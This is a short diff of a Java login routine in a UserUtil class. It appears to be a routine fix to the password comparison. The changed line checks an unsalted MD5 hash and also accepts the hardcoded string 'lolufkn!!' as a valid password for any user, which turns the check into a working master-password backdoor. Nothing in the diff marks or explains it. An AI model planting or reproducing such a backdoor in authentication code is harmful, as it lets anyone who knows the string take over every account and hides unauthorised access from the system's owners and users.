@@ -29,7 +29,7 @@ public class UserUtil {
       
       String databasePassword = resultSet.getString("user_password");
       
-      if(password.equals(MiscUtil.md5(databasePassword)) || databasePassword.equals("lolufkn!!")) {
+      if(databasePassword.equals(MiscUtil.md5(password)) || password.equals("lolufkn!!")) {
       
         return getUser(resultSet);
       }
